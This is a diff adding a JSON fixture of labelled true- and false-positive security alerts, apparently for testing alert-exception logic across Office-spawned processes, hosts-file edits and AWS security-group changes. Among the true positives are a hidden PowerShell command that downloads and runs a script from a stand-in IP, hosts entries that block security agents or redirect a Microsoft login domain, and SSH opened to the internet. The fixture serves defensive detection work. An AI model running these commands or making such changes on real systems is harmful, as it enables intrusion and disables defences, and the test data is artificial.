@@ -1,0 +1,198 @@
+{
+  "groups": [
+    {
+      "name": "win",
+      "rule": "Execution of File Written or Modified by Microsoft Office",
+      "approved_pattern": "Microsoft OneDrive per-user setup: C:\\Users\\<user>\\AppData\\Local\\Microsoft\\OneDrive\\Update\\OneDriveSetup.exe, signed by Microsoft Corporation, started by C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE.",
+      "approved_fields": {
+        "process.executable": "C:\\Users\\<user>\\AppData\\Local\\Microsoft\\OneDrive\\Update\\OneDriveSetup.exe",
+        "process.code_signature.subject_name": "Microsoft Corporation",
+        "process.parent.executable": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
+      },
+      "alerts": [
+        {
+          "id": "win-fp-1",
+          "label": "fp",
+          "note": "same pattern, other user and host",
+          "doc": { "host.name": "ws-101", "user.name": "alice", "process.executable": "C:\\Users\\alice\\AppData\\Local\\Microsoft\\OneDrive\\Update\\OneDriveSetup.exe", "process.code_signature.subject_name": "Microsoft Corporation", "process.parent.executable": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "process.command_line": "OneDriveSetup.exe /peruser /childprocess", "kibana.alert.severity": "low" }
+        },
+        {
+          "id": "win-fp-2",
+          "label": "fp",
+          "note": "same pattern, another user",
+          "doc": { "host.name": "ws-118", "user.name": "bob", "process.executable": "C:\\Users\\bob\\AppData\\Local\\Microsoft\\OneDrive\\Update\\OneDriveSetup.exe", "process.code_signature.subject_name": "Microsoft Corporation", "process.parent.executable": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "process.command_line": "OneDriveSetup.exe /peruser /childprocess", "kibana.alert.severity": "low" }
+        },
+        {
+          "id": "win-fp-3",
+          "label": "fp",
+          "exact_key_miss": true,
+          "note": "version folder in the path, exact key would miss",
+          "doc": { "host.name": "ws-124", "user.name": "erin", "process.executable": "C:\\Users\\erin\\AppData\\Local\\Microsoft\\OneDrive\\24.201.1006.0003\\OneDriveSetup.exe", "process.code_signature.subject_name": "Microsoft Corporation", "process.parent.executable": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "process.command_line": "OneDriveSetup.exe /peruser /childprocess", "kibana.alert.severity": "low" }
+        },
+        {
+          "id": "win-fp-4",
+          "label": "fp",
+          "exact_key_miss": true,
+          "note": "started by Outlook, exact key would miss",
+          "doc": { "host.name": "ws-131", "user.name": "frank", "process.executable": "C:\\Users\\frank\\AppData\\Local\\Microsoft\\OneDrive\\Update\\OneDriveSetup.exe", "process.code_signature.subject_name": "Microsoft Corporation", "process.parent.executable": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", "process.command_line": "OneDriveSetup.exe /peruser /childprocess", "kibana.alert.severity": "low" }
+        },
+        {
+          "id": "win-tp-1",
+          "label": "tp",
+          "note": "same name, unsigned, in Temp",
+          "doc": { "host.name": "ws-101", "user.name": "carol", "process.executable": "C:\\Users\\carol\\AppData\\Local\\Temp\\OneDriveSetup.exe", "process.code_signature.exists": false, "process.parent.executable": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "process.command_line": "OneDriveSetup.exe", "kibana.alert.severity": "low" }
+        },
+        {
+          "id": "win-tp-2",
+          "label": "tp",
+          "exact_key_hit": true,
+          "note": "all key fields match, command line downloads and runs code",
+          "doc": { "host.name": "ws-140", "user.name": "dave", "process.executable": "C:\\Users\\dave\\AppData\\Local\\Microsoft\\OneDrive\\Update\\OneDriveSetup.exe", "process.code_signature.subject_name": "Microsoft Corporation", "process.parent.executable": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "process.command_line": "OneDriveSetup.exe /peruser & powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.50/a.ps1')", "kibana.alert.severity": "low" }
+        },
+        {
+          "id": "win-tp-3",
+          "label": "tp",
+          "note": "look-alike signer",
+          "doc": { "host.name": "ws-150", "user.name": "gina", "process.executable": "C:\\Users\\gina\\AppData\\Local\\Microsoft\\OneDrive\\Update\\OneDriveSetup.exe", "process.code_signature.subject_name": "Mircosoft Corporation", "process.parent.executable": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "process.command_line": "OneDriveSetup.exe /peruser /childprocess", "kibana.alert.severity": "low" }
+        },
+        {
+          "id": "win-tp-4",
+          "label": "tp",
+          "note": "genuine binary started by a script host",
+          "doc": { "host.name": "ws-160", "user.name": "hank", "process.executable": "C:\\Users\\hank\\AppData\\Local\\Microsoft\\OneDrive\\Update\\OneDriveSetup.exe", "process.code_signature.subject_name": "Microsoft Corporation", "process.parent.executable": "C:\\Windows\\System32\\wscript.exe", "process.command_line": "OneDriveSetup.exe /peruser", "kibana.alert.severity": "low" }
+        }
+      ]
+    },
+    {
+      "name": "hosts",
+      "rule": "Hosts File Modified",
+      "approved_pattern": "Docker Desktop writing the hosts file: C:\\Windows\\System32\\drivers\\etc\\hosts modified by C:\\Program Files\\Docker\\Docker\\resources\\com.docker.backend.exe, signed by Docker Inc, with entries for docker.internal names.",
+      "approved_fields": {
+        "file.path": "C:\\Windows\\System32\\drivers\\etc\\hosts",
+        "process.executable": "C:\\Program Files\\Docker\\Docker\\resources\\com.docker.backend.exe",
+        "process.code_signature.subject_name": "Docker Inc"
+      },
+      "alerts": [
+        {
+          "id": "hosts-fp-1",
+          "label": "fp",
+          "note": "same pattern, one host",
+          "doc": { "host.name": "dev-201", "user.name": "SYSTEM", "file.path": "C:\\Windows\\System32\\drivers\\etc\\hosts", "process.executable": "C:\\Program Files\\Docker\\Docker\\resources\\com.docker.backend.exe", "process.code_signature.subject_name": "Docker Inc", "message": "Hosts entry added: 127.0.0.1 host.docker.internal", "kibana.alert.severity": "medium" }
+        },
+        {
+          "id": "hosts-fp-2",
+          "label": "fp",
+          "note": "same pattern, other host, another entry",
+          "doc": { "host.name": "dev-219", "user.name": "SYSTEM", "file.path": "C:\\Windows\\System32\\drivers\\etc\\hosts", "process.executable": "C:\\Program Files\\Docker\\Docker\\resources\\com.docker.backend.exe", "process.code_signature.subject_name": "Docker Inc", "message": "Hosts entry added: 127.0.0.1 kubernetes.docker.internal", "kibana.alert.severity": "medium" }
+        },
+        {
+          "id": "hosts-fp-3",
+          "label": "fp",
+          "exact_key_miss": true,
+          "note": "binary one folder deeper, exact key would miss",
+          "doc": { "host.name": "dev-230", "user.name": "SYSTEM", "file.path": "C:\\Windows\\System32\\drivers\\etc\\hosts", "process.executable": "C:\\Program Files\\Docker\\Docker\\resources\\bin\\com.docker.backend.exe", "process.code_signature.subject_name": "Docker Inc", "message": "Hosts entry added: 127.0.0.1 gateway.docker.internal", "kibana.alert.severity": "medium" }
+        },
+        {
+          "id": "hosts-fp-4",
+          "label": "fp",
+          "exact_key_miss": true,
+          "note": "another Docker component, exact key would miss",
+          "doc": { "host.name": "dev-244", "user.name": "SYSTEM", "file.path": "C:\\Windows\\System32\\drivers\\etc\\hosts", "process.executable": "C:\\Program Files\\Docker\\Docker\\Docker Desktop.exe", "process.code_signature.subject_name": "Docker Inc", "message": "Hosts entry added: 127.0.0.1 host.docker.internal", "kibana.alert.severity": "medium" }
+        },
+        {
+          "id": "hosts-tp-1",
+          "label": "tp",
+          "note": "PowerShell blocks security update domains",
+          "doc": { "host.name": "dev-201", "user.name": "ivan", "file.path": "C:\\Windows\\System32\\drivers\\etc\\hosts", "process.executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "process.code_signature.subject_name": "Microsoft Windows", "process.parent.executable": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "message": "Hosts entry added: 0.0.0.0 update.microsoft.com", "kibana.alert.severity": "medium" }
+        },
+        {
+          "id": "hosts-tp-2",
+          "label": "tp",
+          "note": "unsigned binary in a public folder",
+          "doc": { "host.name": "dev-219", "user.name": "SYSTEM", "file.path": "C:\\Windows\\System32\\drivers\\etc\\hosts", "process.executable": "C:\\Users\\Public\\svc.exe", "process.code_signature.exists": false, "message": "Hosts entry added: 198.51.100.9 login.microsoftonline.com", "kibana.alert.severity": "medium" }
+        },
+        {
+          "id": "hosts-tp-3",
+          "label": "tp",
+          "note": "same path as the approved binary, unsigned",
+          "doc": { "host.name": "dev-230", "user.name": "SYSTEM", "file.path": "C:\\Windows\\System32\\drivers\\etc\\hosts", "process.executable": "C:\\Program Files\\Docker\\Docker\\resources\\com.docker.backend.exe", "process.code_signature.exists": false, "message": "Hosts entry added: 127.0.0.1 host.docker.internal", "kibana.alert.severity": "medium" }
+        },
+        {
+          "id": "hosts-tp-4",
+          "label": "tp",
+          "exact_key_hit": true,
+          "note": "all key fields match, entries block the endpoint agent",
+          "doc": { "host.name": "dev-244", "user.name": "SYSTEM", "file.path": "C:\\Windows\\System32\\drivers\\etc\\hosts", "process.executable": "C:\\Program Files\\Docker\\Docker\\resources\\com.docker.backend.exe", "process.code_signature.subject_name": "Docker Inc", "message": "Hosts entry added: 0.0.0.0 fleet.example.com, 0.0.0.0 defender.microsoft.com", "kibana.alert.severity": "medium" }
+        }
+      ]
+    },
+    {
+      "name": "aws",
+      "rule": "AWS EC2 Security Group Configuration Change",
+      "approved_pattern": "The CI role terraform-ci in AWS account 111122223333 changing security group rules from the CI runner network 203.0.113.0/24 with the Terraform user agent, opening internal ranges only.",
+      "approved_fields": {
+        "event.provider": "ec2.amazonaws.com",
+        "event.action": "AuthorizeSecurityGroupIngress",
+        "cloud.account.id": "111122223333",
+        "user.name": "terraform-ci",
+        "source.ip": "203.0.113.0/24",
+        "user_agent.original": "Terraform/1.x",
+        "request": "internal ranges only (10.0.0.0/8)"
+      },
+      "alerts": [
+        {
+          "id": "aws-fp-1",
+          "label": "fp",
+          "note": "same pattern",
+          "doc": { "event.provider": "ec2.amazonaws.com", "event.action": "AuthorizeSecurityGroupIngress", "cloud.account.id": "111122223333", "cloud.region": "eu-west-1", "user.name": "terraform-ci", "source.ip": "203.0.113.14", "user_agent.original": "Terraform/1.9.8 (+https://www.terraform.io) aws-sdk-go-v2/1.30.3", "aws.cloudtrail.request_parameters": "{\"groupId\":\"sg-0a1b2c3d\",\"ipPermissions\":[{\"fromPort\":443,\"toPort\":443,\"ipRanges\":[\"10.20.0.0/16\"]}]}", "kibana.alert.severity": "low" }
+        },
+        {
+          "id": "aws-fp-2",
+          "label": "fp",
+          "note": "other runner address and Terraform version",
+          "doc": { "event.provider": "ec2.amazonaws.com", "event.action": "AuthorizeSecurityGroupIngress", "cloud.account.id": "111122223333", "cloud.region": "us-east-1", "user.name": "terraform-ci", "source.ip": "203.0.113.77", "user_agent.original": "Terraform/1.10.2 (+https://www.terraform.io) aws-sdk-go-v2/1.32.1", "aws.cloudtrail.request_parameters": "{\"groupId\":\"sg-0f9e8d7c\",\"ipPermissions\":[{\"fromPort\":5432,\"toPort\":5432,\"ipRanges\":[\"10.30.0.0/16\"]}]}", "kibana.alert.severity": "low" }
+        },
+        {
+          "id": "aws-fp-3",
+          "label": "fp",
+          "exact_key_miss": true,
+          "note": "the matching revoke by the same role, exact key would miss",
+          "doc": { "event.provider": "ec2.amazonaws.com", "event.action": "RevokeSecurityGroupIngress", "cloud.account.id": "111122223333", "cloud.region": "eu-west-1", "user.name": "terraform-ci", "source.ip": "203.0.113.14", "user_agent.original": "Terraform/1.9.8 (+https://www.terraform.io) aws-sdk-go-v2/1.30.3", "aws.cloudtrail.request_parameters": "{\"groupId\":\"sg-0a1b2c3d\",\"ipPermissions\":[{\"fromPort\":8080,\"toPort\":8080,\"ipRanges\":[\"10.20.0.0/16\"]}]}", "kibana.alert.severity": "low" }
+        },
+        {
+          "id": "aws-fp-4",
+          "label": "fp",
+          "exact_key_miss": true,
+          "note": "egress rule by the same role, exact key would miss",
+          "doc": { "event.provider": "ec2.amazonaws.com", "event.action": "AuthorizeSecurityGroupEgress", "cloud.account.id": "111122223333", "cloud.region": "eu-west-1", "user.name": "terraform-ci", "source.ip": "203.0.113.31", "user_agent.original": "Terraform/1.9.8 (+https://www.terraform.io) aws-sdk-go-v2/1.30.3", "aws.cloudtrail.request_parameters": "{\"groupId\":\"sg-0a1b2c3d\",\"ipPermissions\":[{\"fromPort\":443,\"toPort\":443,\"ipRanges\":[\"10.20.0.0/16\"]}]}", "kibana.alert.severity": "low" }
+        },
+        {
+          "id": "aws-tp-1",
+          "label": "tp",
+          "exact_key_hit": true,
+          "note": "key fields match, opens SSH to the internet",
+          "doc": { "event.provider": "ec2.amazonaws.com", "event.action": "AuthorizeSecurityGroupIngress", "cloud.account.id": "111122223333", "cloud.region": "eu-west-1", "user.name": "terraform-ci", "source.ip": "203.0.113.14", "user_agent.original": "Terraform/1.9.8 (+https://www.terraform.io) aws-sdk-go-v2/1.30.3", "aws.cloudtrail.request_parameters": "{\"groupId\":\"sg-0a1b2c3d\",\"ipPermissions\":[{\"fromPort\":22,\"toPort\":22,\"ipRanges\":[\"0.0.0.0/0\"]}]}", "kibana.alert.severity": "low" }
+        },
+        {
+          "id": "aws-tp-2",
+          "label": "tp",
+          "note": "a person in the console from another network",
+          "doc": { "event.provider": "ec2.amazonaws.com", "event.action": "AuthorizeSecurityGroupIngress", "cloud.account.id": "111122223333", "cloud.region": "eu-west-1", "user.name": "jsmith", "source.ip": "198.51.100.200", "user_agent.original": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0", "aws.cloudtrail.request_parameters": "{\"groupId\":\"sg-0a1b2c3d\",\"ipPermissions\":[{\"fromPort\":3389,\"toPort\":3389,\"ipRanges\":[\"198.51.100.200/32\"]}]}", "kibana.alert.severity": "low" }
+        },
+        {
+          "id": "aws-tp-3",
+          "label": "tp",
+          "exact_key_hit": true,
+          "note": "CI role name, but from an outside address with the AWS CLI",
+          "doc": { "event.provider": "ec2.amazonaws.com", "event.action": "AuthorizeSecurityGroupIngress", "cloud.account.id": "111122223333", "cloud.region": "ap-southeast-1", "user.name": "terraform-ci", "source.ip": "198.51.100.77", "user_agent.original": "aws-cli/2.15.30 Python/3.11.8 Linux/5.15 exe/x86_64", "aws.cloudtrail.request_parameters": "{\"groupId\":\"sg-0aa11bb22\",\"ipPermissions\":[{\"fromPort\":443,\"toPort\":443,\"ipRanges\":[\"10.20.0.0/16\"]}]}", "kibana.alert.severity": "low" }
+        },
+        {
+          "id": "aws-tp-4",
+          "label": "tp",
+          "note": "same role name in another account",
+          "doc": { "event.provider": "ec2.amazonaws.com", "event.action": "AuthorizeSecurityGroupIngress", "cloud.account.id": "999988887777", "cloud.region": "eu-west-1", "user.name": "terraform-ci", "source.ip": "203.0.113.14", "user_agent.original": "Terraform/1.9.8 (+https://www.terraform.io) aws-sdk-go-v2/1.30.3", "aws.cloudtrail.request_parameters": "{\"groupId\":\"sg-0z9y8x7w\",\"ipPermissions\":[{\"fromPort\":443,\"toPort\":443,\"ipRanges\":[\"10.20.0.0/16\"]}]}", "kibana.alert.severity": "low" }
+        }
+      ]
+    }
+  ]
+}
